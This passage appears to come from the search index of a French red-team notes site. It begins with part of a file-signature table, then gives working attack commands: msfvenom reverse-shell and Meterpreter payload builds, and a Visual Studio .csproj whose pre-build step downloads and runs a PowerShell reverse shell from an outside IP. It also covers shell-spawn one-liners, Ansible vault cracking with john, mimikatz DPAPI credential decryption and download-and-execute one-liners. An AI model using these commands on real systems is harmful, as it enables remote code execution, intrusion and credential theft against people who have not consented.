...  (every 188th byte) ts  tsv  tsa  mpg  mpeg MPEG Transport Stream (MPEG-2 Part 1)66(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-66) <code>00 00 01 BA</code> <code>\u2400\u2400\u2401\u00ba</code> 0 m2p  vob  mpg  mpeg MPEG Program Stream (MPEG-1 Part 1 (essentially identical) and MPEG-2 Part 1) <code>00 00 01 B3</code> <code>\u2400\u2400\u2401\u00b3</code> 0 mpg  mpeg MPEG-1 video and MPEG-2 video (MPEG-1 Part 2 and MPEG-2 Part 2) <code>66 74 79 70 69 73 6F 6D</code> <code>ftypisom</code> 4 mp4 ISO Base Media file (MPEG-4) <code>66 74 79 70 4D 53 4E 56</code> <code>ftypMSNV</code> 4 mp4 MPEG-4 video file <code>78 01</code> <code>x\u2401</code> 0 zlib No Compression (no preset dictionary) <code>78 5E</code> <code>x^</code> Best speed (no preset dictionary) <code>78 9C</code> <code>x\u0153</code> Default Compression (no preset dictionary) <code>78 DA</code> <code>x\u00da</code> Best Compression (no preset dictionary) <code>78 20</code> <code>x\u2420</code> No Compression (with preset dictionary) <code>78 7D</code> <code>x}</code> Best speed (with preset dictionary) <code>78 BB</code> <code>x\u00bb</code> Default Compression (with preset dictionary) <code>78 F9</code> <code>x\u00f9</code> Best Compression (with preset dictionary) <code>62 76 78 32</code> <code>bvx2</code> 0 lzfse LZFSE - Lempel-Ziv style data compression algorithm using Finite State Entropy coding. OSS by Apple.67(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-67) <code>4F 52 43</code> <code>ORC</code> 0 orc Apache ORC (Optimized Row Columnar) file format <code>4F 62 6A 01</code> <code>Obj\u2401</code> 0 avro Apache Avro binary file format <code>53 45 51 36</code> <code>SEQ6</code> 0 rc RCFile columnar file format <code>3C 72 6F 62 6C 6F 78 21</code> <code>&lt;roblox!</code> 0 rbxl Roblox place file 68(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-68) <code>65 87 78 56</code> <code>e\u2021xV</code> 0 p25  obt PhotoCap Object Templates <code>55 55 AA AA</code> <code>UU\u00aa\u00aa</code> 0 pcv PhotoCap Vector <code>78 56 34</code> <code>xV4</code> 0 pbt  pdt  pea  peb  pet  pgt  pict  pjt  pkt  pmt PhotoCap Template <code>50 41 52 31</code> <code>PAR1</code> 0 Apache Parquet columnar file format <code>45 4D 58 32</code> <code>EMX2</code> 0 ez2 Emulator Emaxsynth samples <code>45 4D 55 33</code> <code>EMU3</code> 0 ez3  iso Emulator III synth samples <code>1B 4C 75 61</code> <code>\u241bLua</code> 0 luac Lua bytecode69(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-69) <code>62 6F 6F 6B 00 00 00 00   6D 61 72 6B 00 00 00 00</code> <code>book\u2400\u2400\u2400\u2400mark\u2400\u2400\u2400\u2400</code> 0 alias macOS file Alias70(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-70) (Symbolic link) <code>5B 5A 6F 6E 65 54 72 61   6E 73 66 65 72 5D</code> <code>[ZoneTransfer]</code> 0 Identifier Microsoft Zone Identifier for URL Security Zones71(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-71)72(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-72) <code>52 65 63 65 69 76 65 64   3A</code> <code>Received:</code> 0 eml Email Message var5[citation needed] <code>20 02 01 62 A0 1E AB 07   02 00 00 00</code> <code>\u2420\u2402\u2401b\u237d\u241e\u00ab\u2407\u2402\u2400\u2400\u2400</code> 0 tde Tableau Datasource <code>37 48 03 02 00 00 00 00   58 35 30 39 4B 45 59</code> <code>7H\u2403\u2402\u2400\u2400\u2400\u2400X509KEY</code> 0 kdb KDB file <code>85\u00a0??\u00a0?? 03</code> <code>\u2026??\u2403</code> 0 pgp PGP file 73(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-73) <code>28 B5 2F FD</code> <code>(\u00b5/\u00fd</code> 0 zst Zstandard compress74(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-74)75(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-75) <code>52 53 56 4B 44 41 54 41</code> <code>RSVKDATA</code> 0 rs QuickZip rs compressed archive76(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-76)77(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-77) <code>3A 29 0A</code> <code>:)\u240a</code> 0 sml Smile file <code>4A 6F 79 21</code> <code>Joy!</code> 0 Preferred Executable Format <code>31 0A 30 30</code> <code>1\u240a00</code> 0 srt SubRip File <code>34 12 AA 55</code> <code>4\u2412\u00aaU</code> 0 vpk VPK file, used to store game data for some Source Engine games <code>2A 2A 41 43 45 2A 2A</code> <code>**ACE**</code> 7 ace ACE (compressed file format)[citation needed] <code>60 EA</code> <code>`\u00ea</code> 0 arj ARJ <code>49 53 63 28</code> <code>ISc(</code> 0 cab InstallShield CAB Archive File <code>4B 57 41 4A</code> <code>KWAJ</code> 0 ??_ Windows 3.1x Compressed File <code>53 5A 44 44</code> <code>SZDD</code> 0 ??_ Windows 9x Compressed File <code>5A 4F 4F</code> <code>ZOO</code> 0 zoo Zoo (file format) <code>50 31 0A</code> <code>P1\u240a</code> 0 pbm Portable bitmap ASCII <code>50 34 0A</code> <code>P4\u240a</code> 0 pbm Portable bitmap binary <code>50 32 0A</code> <code>P2\u240a</code> 0 pgm Portable Gray Map ASCII <code>50 35 0A</code> <code>P5\u240a</code> 0 pgm Portable Gray Map binary <code>50 33 0A</code> <code>P3\u240a</code> 0 ppm Portable Pixmap ASCII <code>50 36 0A</code> <code>P6\u240a</code> 0 ppm Portable Pixmap binary <code>D7 CD C6 9A</code> <code>\u00d7\u00cd\u00c6\u0161</code> 0 wmf Windows Metafile <code>67 69 6D 70 20 78 63 66</code> <code>gimp xcf</code> 0 xcf XCF (file format) <code>2F 2A 20 58 50 4D 20 2A   2F</code> <code>/* XPM */</code> 0 xpm X PixMap <code>41 46 46</code> <code>AFF</code> 0 aff Advanced Forensics Format <code>45 56 46 32</code> <code>EVF2</code> 0 Ex01 EnCase EWF version 2 format <code>45 56 46</code> <code>EVF</code> 0 e01 EnCase EWF version 1 format <code>51 46 49</code> <code>QFI</code> 0 qcow qcow file format <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0??   41 43 4F 4E</code> <code>RIFF????ACON</code> 0 ani Animated cursor <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0??   43 44 44 41</code> <code>RIFF????CDDA</code> 0 cda .cda file <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0??   51 4C 43 4D</code> <code>RIFF????QLCM</code> 0 qcp Qualcomm PureVoice file format <code>52 49 46 58\u00a0??\u00a0??\u00a0??\u00a0??   46 47 44 4D</code> (big-endian) <code>RIFX????FGDM</code> 0 dcr Adobe Shockwave78(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-78)79(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-SW-79)80(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-Exe2SW-80) <code>58 46 49 52\u00a0??\u00a0??\u00a0??\u00a0??   4D 44 47 46</code> (little-endian) <code>XFIR????MDGF</code> <code>52 49 46 58\u00a0??\u00a0??\u00a0??\u00a0??   4D 56 39 33</code> (big-endian) <code>RIFX????MV93</code> 0 dir  dxr  drx Macromedia Director file format81(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-81)79(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-SW-79)80(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-Exe2SW-80) <code>58 46 49 52\u00a0??\u00a0??\u00a0??\u00a0??   33 39 56 4D</code> (little-endian) <code>XFIR????39VM</code> <code>46 4C 56</code> <code>FLV</code> 0 flv Flash Video file <code>3C 3C 3C 20 4F 72 61 63   6C 65 20 56 4D 20 56 69   72 74 75 61 6C 42 6F 78   20 44 69 73 6B 20 49 6D   61 67 65 20 3E 3E 3E</code> <code>&lt;&lt;&lt; Orac   le VM Vi   rtualBox   Disk Im   age &gt;&gt;&gt;</code> 0 vdi VirtualBox Virtual Hard Disk file format <code>63 6F 6E 6E 65 63 74 69   78</code> <code>connectix</code> 0 vhd Windows Virtual PC Virtual Hard Disk file format <code>76 68 64 78 66 69 6C 65</code> <code>vhdxfile</code> 0 vhdx Windows Virtual PC Windows 8 Virtual Hard Disk file format <code>49 73 5A 21</code> <code>IsZ!</code> 0 isz Compressed ISO image <code>44 41 41</code> <code>DAA</code> 0 daa Direct Access Archive PowerISO <code>4C 66 4C 65</code> <code>LfLe</code> 0 evt Windows Event Viewer file format <code>45 6C 66 46 69 6C 65</code> <code>ElfFile</code> 0 evtx Windows Event Viewer XML file format <code>73 64 62 66</code> <code>sdbf</code> 8 sdb Windows customized database <code>50 4D 43 43</code> <code>PMCC</code> 0 grp Windows 3.x Program Manager Program Group file format <code>4B 43 4D 53</code> <code>KCMS</code> 0 icm ICC profile <code>72 65 67 66</code> <code>regf</code> 0 dat  hiv Windows Registry file <code>21 42 44 4E</code> <code>!BDN</code> 0 pst Microsoft Outlook Personal Storage Table file <code>44 52 41 43 4F</code> <code>DRACO</code> 0 drc 3D model compressed with Google Draco82(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-82) <code>47 52 49 42</code> <code>GRIB</code> 0 grib  grib2 Gridded data (commonly weather observations or forecasts) in the WMO GRIB or GRIB2 format83(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-83) <code>42 4C 45 4E 44 45 52</code> <code>BLENDER</code> 0 blend Blender File Format84(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-84) <code>00 00 00 0C 4A 58 4C 20 0D 0A 87 0A</code> <code>\u2400\u2400\u2400\u240cJXL\u2420\u240d\u240a\u2021\u240a</code> 0 jxl Image encoded in the JPEG XL format85(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-85) <code>FF 0A</code> <code>\u00ff\u240a</code> <code>00 01 00 00 00</code> <code>\u2400\u2401\u2400\u2400\u2400</code> 0 ttf  tte  dfont TrueType font <code>4F 54 54 4F</code> <code>OTTO</code> 0 otf OpenType font86(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-86) <code>23 25 4D 6F 64 75 6C 65</code> <code>#%Module</code> 0 Modulefile for Environment Modules87(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-87) <code>4D 53 57 49 4D 00 00 00   D0 00 00 00 00</code> <code>MSWIM\u2400\u2400\u2400\u00d0\u2400\u2400\u2400\u2400</code> 0 wim  swm  esd Windows Imaging Format file <code>21 2D 31 53 4C 4F 42 1F</code> <code>!-1SLOB\u241f</code> 0 slob Slob (sorted list of blobs) is a read-only, compressed data store with dictionary-like interface88(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-88) <code>AC ED</code> <code>\u00ac\u00ed</code> 0 Serialized Java Data89(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-89) <code>43 72 65 61 74 69 76 65 20 56 6F 69 63 65 20 46 69 6C 65 1A 1A 00</code> Creative Voice File 0 voc Creative Voice file <code>2E 73 6E 64</code> <code>.snd</code> 0 au  snd Au audio file format <code>DB 0A CE 00</code> 0 OpenGL Iris Perfomer .PFB (Performer Fast Binary)90(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-90) <code>48 5a 4c 52 00 00 00 18</code> <code>HZLR</code> 0 hazelrules Noodlesoft Hazel 91(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-91) <code>46 4C 68 64</code> <code>FLhd</code> 0 flp FL Studio Project File <code>31 30 4C 46</code> <code>10LF</code> 0 flm FL Studio Mobile Project File <code>52 4b 4d 43 32 31 30</code> <code>RKMC210</code> 0 Vormetric Encryption DPM Version 2.1 Header92(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-92) <code>00 01 00 00 4D 53 49 53 41 4D 20 44 61 74 61 62 61 73 65</code> <code>\u2400\u2401\u2400\u2400MSISAM Database</code> 0 mny Microsoft Money file <code>00 01 00 00 53 74 61 6E 64 61 72 64 20 41 43 45 20 44 42</code> <code>\u2400\u2401\u2400\u2400Standard ACE DB</code> 0 accdb Microsoft Access 2007 Database <code>00 01 00 00 53 74 61 6E 64 61 72 64 20 4A 65 74 20 44 42</code> <code>\u2400\u2401\u2400\u2400Standard Jet DB</code> 0 mdb Microsoft Access Database <code>01 FF 02 04 03 02</code> <code>\u2401\u00ff\u2402\u2404\u2403\u2402</code> 0 drw Micrografx vector graphic file <code>02 64 73 73</code> <code>\u2402dss</code> 0 dss Digital Speech Standard (Olympus, Grundig, &amp; Phillips) v2 <code>03 64 73 73</code> <code>\u2403dss</code> 0 dss Digital Speech Standard (Olympus, Grundig, &amp; Phillips) v3 <code>03 00 00 00 41 50 50 52</code> <code>\u2403\u2400\u2400\u2400APPR</code> 0 adx Approach index file <code>06 06 ED F5 D8 1D 46 E5 BD 31 EF E7 FE 74 B7 1D</code> <code>\u2406\u2406\u00ed\u00f5\u00d8\u241dF\u00e5\u00bd1\u00ef\u00e7\u00fet\u00b7\u241d</code> 0 indd Adobe InDesign document <code>06 0E 2B 34 02 05 01 01 0D 01 02 01 01 02</code> <code>\u2406\u240e+4\u2402\u2405\u2401\u2401\u240d\u2401\u2402\u2401\u2401\u2402</code> 0-65535 (run-in) mxf Material Exchange Format file <code>07 53 4B 46</code> <code>\u2407SKF</code> 0 skf SkinCrafter skin file <code>07 64 74 32 64 64 74 64</code> <code>\u2407dt2ddtd</code> 0 dtd DesignTools 2D Design file <code>0A 16 6F 72 67 2E 62 69 74 63 6F 69 6E 2E 70 72</code> <code>\u240a\u2416org.bitcoin.pr</code> 0 wallet MultiBit Bitcoin wallet file <code>0D 44 4F 43</code> <code>\u240dDOC</code> 0 doc DeskMate Document file <code>0E 4E 65 72 6F 49 53 4F</code> <code>\u240eNeroISO</code> 0 nri Nero CD Compilation <code>0E 57 4B 53</code> <code>\u240eWKS</code> 0 wks DeskMate Worksheet <code>0F 53 49 42 45 4C 49 55 53</code> <code>\u240fSIBELIUS</code> 0 sib Sibelius Music - Score file <code>23 20 4D 69 63 72 6F 73 6F 66 74 20 44 65 76 65 6C 6F 70 65 72 20 53 74 75 64 69 6F</code> <code># Microsoft Developer Studio</code> 0 dsp Microsoft Developer Studio project file <code>23 21 41 4D 52</code> <code>#!AMR</code> 0 amr Adaptive Multi-Rate ACELP (Algebraic Code Excited Linear Prediction) Codec, commonly audio format with GSM cell phones. <code>23 21 53 49 4C 4B 0A</code> <code>#!SILK\u240a</code> 0 sil Audio compression format developed by Skype <code>23 3F 52 41 44 49 41 4E 43 45 0A</code> <code>#?RADIANCE\u240a</code> 0 hdr Radiance High Dynamic Range image file <code>23 40 7E 5E</code> <code>#@~^</code> 0 vbe VBScript Encoded script <code>0D F0 1D C0</code> <code>\u240d\u00f0\ufffd\u00c0</code> 0 cdb MikroTik WinBox Connection Database (Address Book) <code>23 45 58 54 4D 33 55</code> <code>#EXTM3U</code> 0 m3um3u8 Multimedia playlist <code>6D 64 66 00</code> <code>mdf\u2400</code> 0 m M2 Archive, used by game developer M2 <code>4B 50 4B 41</code> <code>KPKA</code> 0 pak Capcom RE Engine game data archives <code>41 52 43</code> <code>ARC</code> 0 arc Capcom MT Framework game data archives <code>D0 4F 50 53</code> <code>\u00d0OPS</code> 0 pl Interleaf PrinterLeaf / WorldView document format (now Broadvision QuickSilver) <code>6E 2B 31 00</code> <code>n+1</code> 344 nii Single file NIfTI format, used extensively in biomedical imaging. <code>6E 69 31 00</code> <code>ni1</code> 344 hdr Header file of a .hdr/.img pair in NIfTI format, used extensively in biomedical imaging. <code>52 41 46 36 34</code> <code>RAF64</code> 0 Report Builder file from Digital Metaphors <code>56 49 53 33</code> <code>VIS3</code> 0 Resource file Visionaire 3.x Engine <code>4D 53 48 7C</code> <code>42 53 48 7C</code> <code>MSH</code>|  <code>BSH</code>| 0 hl7 Health Level Seven (HL7) Standard for electronic data exchange 1(https://www.hl7.eu/HL7v2x/v25/std25/hl7.html) <code>70 77 72 64 61 74 61</code> <code>pwrdata</code> 0 pwrdata SAP Power Monitor (version 1.1.0 and higher) data file <code>1a 08</code> <code>..</code> 0 arc ARC archive file <code>2d 2d 2d 2d 2d 42 45 47 49 4e 20 50 47 50 20 50 55 42 4c 49 43 20 4b 45 49 20 42 4c 4f 43 4b 2d 2d 2d 2d 2d</code> <code>-----BEGIN PGP PUBLIC KEY BLOCK-----</code> 0 asc Armored PGP public key <code>3a 42 61 73 65 20</code> <code>:Base</code> 0 cnt Windows 3.x - Windows 95 Help Contents <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0?? 56 44 52 4d</code> <code>RIFF????VDRM</code> 0 vdr VirtualDub <code>52 59 46 46\u00a0??\u00a0??\u00a0??\u00a0?? 54 52 49 44</code> <code>RIFF????TRID</code> 0 trd TrID <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0?? 73 68 77 34</code> <code>RIFF????shw4</code> 0 shw Corel SHOW! 4.0 <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0?? 73 68 77 35</code> <code>RIFF????shw5</code> 0 shw Corel SHOW! 5.0 <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0?? 73 68 72 35</code> <code>RIFF????shr5</code> 0 shr Corel SHOW! 5.0 player <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0?? 73 68 62 35</code> <code>RIFF????shb5</code> 0 shb Corel SHOW! 5.0 background <code>58 46 49 52\u00a0??\u00a0??\u00a0??\u00a0?? 4d 44 47 46</code> <code>XFIR????MDGF</code> 0 dcr Macromedia ShockWave <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0?? 52 4d 4d 50</code> <code>RIFF????RMMP</code> 0 mmm MacroMind Multimedia Movie or Microsoft Multimedia Movie <code>41 53 54 4d 2d 45 35 37</code> <code>ASTM-E57</code> 0 e57 ASTM E57 3D file format"},{"location":"Red%20Team/6%20-%20Misc/Msfvenom/","title":"Msfvenom","text":"<p>Executable formats</p> <pre><code>asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war\n</code></pre> <p>Transform formats</p> <pre><code>bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript\n</code></pre> <p>Staged Meterpreter</p> <pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=YourIP LPORT=YourPort -f elf &gt; shell-meterp.elf\n</code></pre> <p>Inline Meterpreter</p> <pre><code>msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=YourIP LPORT=YourPort -f elf &gt; santas.elf\n</code></pre> <p>Executable with Meterpreter</p> <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=YourIP LPORT=YourPort -f exe &gt; shell-meterp.exe\n</code></pre> <p>Executable with Windows cmd</p> <pre><code>msfvenom -p windows/shell/reverse_tcp LHOST=YourIP LPORT=YourPort -f exe &gt; shell-cmd.exe\n</code></pre> <p>Windows DLL with Windows cmd</p> <pre><code>msfvenom -p windows/shell/reverse_tcp LHOST=YourIP LPORT=YourPort -f dll &gt; shell-cmd.dll\n</code></pre> <p>Execute Windows Command - g\u00e9n\u00e8re une dll shell32.dll qui lance calc.exe</p> <pre><code>msfvenom -f dll -p windows/exec CMD=\"C:\\windows\\system32\\calc.exe\" -o shell32.dll\n</code></pre> <p>Python</p> <pre><code>msfvenom -p cmd/unix/reverse_python LHOST=YourIP LPORT=YourPort -f raw\n</code></pre> <p>Powershell</p> <pre><code>msfvenom -p windows/powershell_reverse_tcp LHOST=YourIP LPORT=YourPort -f raw\n</code></pre> <p>List encoders</p> <pre><code>msfvenom -l encoders\n</code></pre>"},{"location":"Red%20Team/6%20-%20Misc/Deserialization/Net/","title":"Net","text":"<p>A \u00e9crire, voir https://book.hacktricks.xyz/v/fr/pentesting-web/deserialization/exploiting-__viewstate-parameter pour infos</p>"},{"location":"Red%20Team/6%20-%20Misc/Exploits%20divers/VisualStudio/","title":"VisualStudio","text":"<pre><code>Using code projects for phishing attacks is not a new concept. In early 2021, the Lazarus APT group employed a specific attack technique in their campaign targeting security researchers. They embedded malicious event commands within Visual Studio project files, allowing the execution of harmful code when the project is compiled, as detailed in:\u00a0[New campaign targeting security researchers](https://blog.google/threat-analysis-group/new-campaign-targeting-security-researchers/)\n\nThis incident has once again brought the security of Visual Studio into the public eye. However, it is important to note that Visual Studio is not the only product with such risks. JetBrains' IDEs, VSCode, and other text editors also face similar vulnerabilities when opening unsafe projects. As a response, these products have introduced trust zone mechanisms that disable certain risky functionalities in untrusted environments, aiming to protect their users.\n\nIn this repository, we present a new exploitation technique for Visual Studio projects\u00a0**(Microsoft consider it is not a security issue)**\u00a0and provide a proof of concept. Our intention is to raise awareness about the potential risks involved and empower individuals to avoid being hacked.\n</code></pre> <p>Here are some publicly disclosed methods for exploiting Visual Studio:</p> <p><code>PreBuildEvent</code>: Executes arbitrary commands before project compilation.</p> <pre><code>&lt;PreBuildEvent&gt;\n    &lt;Command&gt;\n    cmd /c calc\n    &lt;/Command&gt;\n&lt;/PreBuildEvent&gt;\n</code></pre> <p><code>GetFrameworkPaths Target</code>: Triggered when viewing code.</p> <pre><code>&lt;Target Name=\"GetFrameworkPaths\"&gt;\n    &lt;Exec Command=\"calc.exe\"/&gt;\n&lt;/Target&gt;\n</code></pre> <p><code>COMFileReference</code>: Triggered when loading\u00a0<code>TypeLib</code>\u00a0during project opening.</p> <pre><code>&lt;COMFileReference Include=\"files\\helpstringdll.tlb\"&gt;\n     &lt;EmbedInteropTypes&gt;True&lt;/EmbedInteropTypes&gt;\n&lt;/COMFileReference&gt;\n</code></pre>"},{"location":"Red%20Team/6%20-%20Misc/Exploits%20divers/VisualStudio/#exemple-dexploit-avec-prebuildevent","title":"Exemple d'exploit avec PreBuildEvent :","text":"<p>Visual.sln :</p> <pre><code>Microsoft Visual Studio Solution File, Format Version 12.00\n# Visual Studio Version 17\nVisualStudioVersion = 17.7.34031.279\nMinimumVisualStudioVersion = 10.0.40219.1\nProject(\"{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}\") = \"Visual\", \"Visual.csproj\", \"{A408C004-8817-4960-BF22-4E7AB8AA1974}\"\nEndProject\nGlobal\n    GlobalSection(SolutionConfigurationPlatforms) = preSolution\n        Debug|Any CPU = Debug|Any CPU\n        Release|Any CPU = Release|Any CPU\n    EndGlobalSection\n    GlobalSection(ProjectConfigurationPlatforms) = postSolution\n        {A408C004-8817-4960-BF22-4E7AB8AA1974}.Debug|Any CPU.ActiveCfg = Debug|Any CPU\n        {A408C004-8817-4960-BF22-4E7AB8AA1974}.Debug|Any CPU.Build.0 = Debug|Any CPU\n        {A408C004-8817-4960-BF22-4E7AB8AA1974}.Release|Any CPU.ActiveCfg = Release|Any CPU\n        {A408C004-8817-4960-BF22-4E7AB8AA1974}.Release|Any CPU.Build.0 = Release|Any CPU\n    EndGlobalSection\n    GlobalSection(SolutionProperties) = preSolution\n        HideSolutionNode = FALSE\n    EndGlobalSection\n    GlobalSection(ExtensibilityGlobals) = postSolution\n        SolutionGuid = {D24BD630-7BA0-46EB-A66C-8723E99703FC}\n    EndGlobalSection\nEndGlobal\n</code></pre> <p>Ainsi qu'un fichier Visual.csproj :</p> <pre><code>&lt;Project Sdk=\"Microsoft.NET.Sdk\"&gt;\n\n  &lt;PropertyGroup&gt;\n    &lt;OutputType&gt;Exe&lt;/OutputType&gt;\n    &lt;TargetFramework&gt;net6.0&lt;/TargetFramework&gt;\n    &lt;ImplicitUsings&gt;enable&lt;/ImplicitUsings&gt;\n    &lt;Nullable&gt;enable&lt;/Nullable&gt;\n  &lt;/PropertyGroup&gt;\n    &lt;Target Name=\"PreBuild\" BeforeTargets=\"PreBuildEvent\"&gt;\n        &lt;Exec Command=\"powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.26:8000/revshell.ps1')\" /&gt;\n    &lt;/Target&gt;\n\n&lt;/Project&gt;\n</code></pre> <p>Juste avant le d\u00e9but du build du projet, la commande pr\u00e9sente dans le fichier .csproj sera ex\u00e9cut\u00e9e (le t\u00e9l\u00e9chargement et l'ex\u00e9cution d'un reverse-shell en powershell).</p>"},{"location":"Red%20Team/6%20-%20Misc/Reverse%20shell/Spawn%20shell/","title":"Spawn shell","text":"<pre><code>/bin/sh -i\n</code></pre> <p>perl:</p> <pre><code>perl \u2014e 'exec \"/bin/sh\";'\n</code></pre> <p>ruby</p> <pre><code>ruby: exec \"/bin/sh\"\n</code></pre> <p>lua:</p> <pre><code>lua: os.execute('/bin/sh')\n</code></pre> <p>awk:</p> <pre><code>awk 'BEGIN {system(\"/bin/sh\")}'\n</code></pre> <p>find:</p> <pre><code>find / -name nameoffile -exec /bin/awk 'BEGIN {system(\"/bin/sh\")}' \\;\n</code></pre> <pre><code>find . -exec /bin/sh \\; -quit\n</code></pre> <p>vim:</p> <pre><code>vim -c ':!/bin/sh'\n</code></pre>"},{"location":"Red%20Team/6%20-%20Misc/Secrets/Ansible%20Vault/","title":"Ansible Vault","text":"<p>Nous r\u00e9cup\u00e9rons un vault sous cette forme :</p> <p><pre><code>$ANSIBLE_VAULT;1.1;AES256\n63303831303534303266356462373731393561313363313038376166336536666232626461653630\n3437333035366235613437373733316635313530326639330a643034623530623439616136363563\n34646237336164356438383034623462323531316333623135383134656263663266653938333334\n3238343230333633350a646664396565633037333431626163306531336336326665316430613566\n3764\n</code></pre> (enregistr\u00e9 dans vault.txt)</p> <p>Utiliser ansible2john : <pre><code>ansible2john vault.txt &gt; crack_vault.txt\n</code></pre></p> <p>cracker le password : <pre><code>john crack_vault.txt -w:/usr/share/Wordlist/rockyou.txt\n</code></pre></p> <p>le mot de passe permet ensuite d'ouvrir le vault: <pre><code>ansible-vault \n</code></pre></p>"},{"location":"Red%20Team/6%20-%20Misc/Secrets/Cli-xml/","title":"Cli xml","text":"<pre><code>$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *\n</code></pre>"},{"location":"Red%20Team/6%20-%20Misc/Secrets/Vault/","title":"Vault","text":"<p>Lister les fichiers credentials :</p> <pre><code>dir /a:h C:\\Users\\username\\AppData\\Local\\Microsoft\\Credentials\\\ndir /a:h C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials\\\n\nGet-ChildItem -Hidden C:\\Users\\username\\AppData\\Local\\Microsoft\\Credentials\\\nGet-ChildItem -Hidden C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials\\\n</code></pre> <p>D\u00e9chiffrer avec mimikatz :</p> <pre><code>dir C:\\Users\\&lt;username&gt;\\AppData\\Local\\Microsoft\\Credentials\\*\n\nmimikatz dpapi::cred /in:C:\\Users\\&lt;username&gt;\\AppData\\Local\\Microsoft\\Credentials\\2647629F5AA74CD934ECD2F88D64ECD0\n# find master key\nmimikatz !sekurlsa::dpapi\n# use master key\nmimikatz dpapi::cred /in:C:\\Users\\&lt;username&gt;\\AppData\\Local\\Microsoft\\Credentials\\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b\n\n# find and export backup keys\nlsadump::backupkeys /system:dc01.lab.local /export\n# use backup keys\ndpapi::masterkey /in:\"C:\\Users\\&lt;USERNAME&gt;\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2552734371-813931464-1050690807-1106\\3e90dd9e-f901-40a1-b691-84d7f647b8fe\" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk\n</code></pre>"},{"location":"Red%20Team/6%20-%20Misc/Transfert%20de%20fichiers/Diff%C3%A9rents%20langages/","title":"Diff\u00e9rents langages","text":"<p>Python 2.7:</p> <pre><code>python2.7 -c 'import urllib;urllib.urlretrieve (\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")'\n</code></pre> <p>Python3:</p> <pre><code>python3 -c 'import urllib.request;urllib.request.urlretrieve(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")'\n</code></pre> <p>PHP:</p> <pre><code>php -r '$file = file_get_contents(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'\n</code></pre> <p>PHP:</p> <pre><code>php -r 'const BUFFER = 1024; $fremote = \nfopen(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"rb\"); $flocal = fopen(\"LinEnum.sh\", \"wb\"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'\n</code></pre> <p>PHP (puis ex\u00e9cution par bash):</p> <pre><code>php -r '$lines = @file(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); foreach ($lines as $line_num =&gt; $line) { echo $line; }' | bash\n</code></pre> <p>Ruby:</p> <pre><code>ruby -e 'require \"net/http\"; File.write(\"LinEnum.sh\", Net::HTTP.get(URI.parse(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\")))'\n</code></pre> <p>Perl:</p> <pre><code>perl -e 'use LWP::Simple; getstore(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\");'\n</code></pre> <p>Windows, via cr\u00e9ation d'un fichier \"wget.js\" (Javascript):</p> <pre><code>contenu 